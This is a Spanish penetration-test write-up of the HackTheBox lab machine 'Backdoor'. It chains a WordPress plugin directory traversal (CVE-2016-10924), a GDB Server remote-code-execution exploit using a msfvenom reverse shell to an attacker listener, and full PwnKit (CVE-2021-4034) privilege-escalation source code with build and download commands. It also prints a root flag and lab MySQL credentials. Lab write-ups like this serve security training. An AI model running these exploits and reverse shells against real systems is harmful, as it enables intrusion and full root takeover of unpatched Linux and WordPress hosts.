---
description: 'Informe de Prueba de Penetración: Backdoor'
---

# Backdoor

### Información del objetivo

| Campo               | Detalle      |
| ------------------- | ------------ |
| Dirección IP        | 10.129.96.68 |
| Sistema operativo   | Linux        |
| Plataforma          | HackTheBox   |
| Fecha de evaluación | 21/10/2026   |

#### 1. Resumen

* Servidor web WordPress y GDB Server descubierto más tarde
* Enumeración de WordPress debido a mala configuración
* Explotación de Directory Traversal (CVE-2016-10924) en plugin de WordPress que nos sirve como trampolín al acceso inicial, revelando gracias a ella el proceso bajo el puerto 1337 (GDB Server)
* Abuso de GDB Server mediante RCE
* Escalada de privilegios mediante vulnerabilidad CVE-2021-4034 que afecta al servicio Polkit (`pkexec`)

#### 2. Recopilación de información

Durante la fase de enumeración se identificaron los siguientes servicios expuestos en el objetivo:

**Escaneo de puertos**

| Puerto   | Servicio   | Versión                                                      | Notas     |
| -------- | ---------- | ------------------------------------------------------------ | --------- |
| 22/tcp   | ssh        | OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) |           |
| 80/tcp   | http       | Apache httpd 2.4.41 ((Ubuntu))                               | Wordpress |
| 1337/tcp | tcpwrapper |                                                              | GDBServer |

Comandos de enumeración empleados:

```bash
nmap -p- --min-rate 5000 -Pn 10.129.96.68 -oG allports.txt
nmap -p22,80,1337 -sCV -Pn 10.129.96.68 -oG services.txt
```

**Enumeración Wordpress**

```bash
wpscan --url http://10.129.96.68/
```

*   Se permite el **listado directo de directorios** en `/wp-content/uploads/`.<br>

    <div data-with-frame="true"><figure><img src="https://715045774-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F1y4jI1alIWxu1LgcFef6%2Fuploads%2FgYK35t5oPPoTk2g2oVk5%2Fimage.png?alt=media&#x26;token=8daae548-6168-4f96-85f7-b0cfbcabc22f" alt=""><figcaption></figcaption></figure></div>
*   Se comprueba manualmente que también en `/wp-content/`<br>

    <div align="left" data-with-frame="true"><figure><img src="https://715045774-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F1y4jI1alIWxu1LgcFef6%2Fuploads%2Fb2MahlFXPbDb2kGyHkTl%2Fimage.png?alt=media&#x26;token=b6e1d6c0-b4f0-43ac-bfcb-b7fabadb93bb" alt="" width="319"><figcaption></figcaption></figure></div>
* El servidor utiliza el plugin `ebook-download`, este plugin es **vulnerable en sus versiones menores a 1.2 a Directory Traversal (CVE-2016-10924)**
  * **PoC**: `http://10.10.15.78/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../../../<SYSTEM_FILEPATH_TOREAD>`
  * Gracias a este exploit se obtiene la siguiente información:
    * **Credenciales de MySQL** en el archivo /var/www/html/wp-config.php
    * Existencia de **2 únicos usuarios con shell** (`root` y `user`) en el archivo `/etc/passwd`
  * Se realiza un proceso de enumeración de procesos con `ffuf` para descubrir PIDs y posteriormente leer su `cmdline`

```bash
ffuf -u "http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../proc/FUZZ/cmdline" -w <(seq 1 2000) -fs 0-200
```

* Esta enumeración revela la existencia del proceso con PID `973`. Al leer el archivo `/proc/973/cmdline` se revela la ejecución de comandos del proceso, que es la siguiente:

```bash
/bin/sh-cwhile true;do su user -c "cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;"; done
```

Este resultado nos indica que en el puerto `1337` corre un servidor **GDBServer**.

#### 3. Acceso inicial

* **Vector:** GDB Server (Vulnerabilidad tipo RCE)
* **Exploit**: [https://www.exploit-db.com/exploits/50539](https://www.exploit-db.com/exploits/50539)
* **Procedimiento:**

1. Se genera el shellcode con `msfvenom`
2. Se pone el puerto 4444 en escucha en la máquina atacante
3. Se ejecuta el exploit

```bash
> msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.15.78 LPORT=4444 PrependFork=true -o rev.bin
```

```bash
> netcat -lvnp 4444
```

```bash
> python3 gdbserver_exploit.py 10.10.96.68:1337 rev.bin
```

<div align="left"><figure><img src="https://715045774-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F1y4jI1alIWxu1LgcFef6%2Fuploads%2FIdyg510QypcvsrjJWMiG%2Fimage.png?alt=media&#x26;token=28cc5d9a-5a52-47f4-823d-dd8c78b04675" alt=""><figcaption><p>Shell recibida en el puerto 4444</p></figcaption></figure></div>

**Evidencia — bandera de usuario (user.txt):**\
![](https://715045774-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F1y4jI1alIWxu1LgcFef6%2Fuploads%2FiKqPJ2tLnqBm622NrYpu%2Fimage.png?alt=media\&token=ff926a04-f534-471c-b4ef-156f1d16b46b)

#### 4. Escalada de privilegios

**Vulnerabilidad:** CVE-2021-4034 (PwnKit)

**Exploit:**

* `exploit.c`

```c
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#define BIN "/usr/bin/pkexec"
#define DIR "evildir"
#define EVILSO "evil"
int main()
{
    char *envp[] = {
        DIR,
        "PATH=GCONV_PATH=.",
        "SHELL=ryaagard",
        "CHARSET=ryaagard",
        NULL
    };
    char *argv[] = { NULL };
    system("mkdir GCONV_PATH=.");
    system("touch GCONV_PATH=./" DIR " && chmod 777 GCONV_PATH=./" DIR);
    system("mkdir " DIR);
    system("echo 'module\tINTERNAL\t\t\tryaagard//\t\t\t" EVILSO "\t\t\t2' > " DIR "/gconv-modules");
    system("cp " EVILSO ".so " DIR);
    execve(BIN, argv, envp);
    return 0;
   }
```

* `evil-so.c`

```c
#define _GNU_SOURCE
#include <unistd.h>
#include <grp.h>
#include <stdio.h>
#include <stdlib.h>
void gconv() {}
void gconv_init() {
    // Cambiado a setresuid/setresgid para soportar los 3 argumentos correctamente
    setresuid(0, 0, 0);
    setresgid(0, 0, 0);
    setgroups(0, NULL);
    // Definimos los argumentos obligatorios para la shell
    char *args[] = {"/bin/sh", NULL};
    char *env[] = {NULL};
    execve("/bin/sh", args, env);
    exit(0);
}
```

* `Makefile`

```makefile
all:
    gcc -shared -o evil.so -fPIC evil-so.c
    gcc -static exploit.c -o exploit
clean:
    rm -r ./GCONV_PATH=. && rm -r ./evildir && rm exploit && rm evil.so
```

**Procedimiento:**

1. Se ejecutó linpeas en la máquina victima, esto reveló el vector de ataque (Hubo varias posibles vulnerabilidades detectadas)
2. Se modificó el código del exploit
3. Se compila y comprime el exploit
4. Se inicia servidor HTTP en el directorio contenedor del exploit compilado y comprimido
5. Se descarga desde máquina victima el archivo comprimido
6. Se extrae el comprimido y se le otorgan permisos de ejecución
7. Se ejecuta el exploit y posteriormente se comprueba el usuario

`Desde máquina victima`

```bash
> ./linpeas.sh # Output muy simplificado
[+] [CVE-2021-4034] PwnKit
   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main
```

`Desde máquina atacante`

```bash
> make all
> zip CVE.zip {exploit,evil.so}
```

```bash
> python3 -m http.server 2000
```

`Desde máquina victima`

```bash
> curl http://10.10.15.78:2000/CVE.zip -o CVE.zip
```

```bash
> unzip CVE.zip
> chmod +x *
> ./exploit
> id
uid=0(root) gid=0(root) groups=0(root)
```

**Evidencia — bandera de usuario administrador (root.txt):**\ <img src="https://715045774-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F1y4jI1alIWxu1LgcFef6%2Fuploads%2F6D3QcXNGX18OHChakXkB%2Fimage.png?alt=media&#x26;token=38020700-7544-4742-a0ee-236102edac46" alt="" data-size="original">\
Valor obtenido: `ffcdba701a52fbb27db1d051db1873b6`

#### 5. Información sensible

* **Credenciales de MySQL** en el archivo `/var/www/html/wp-config.php`
  * **Database**: `wordpress`
  * **Username**: `wordpressuser`
  * **Password**: `MQYBJSaD#DxG6qbm`
  * **Host**: `localhost`
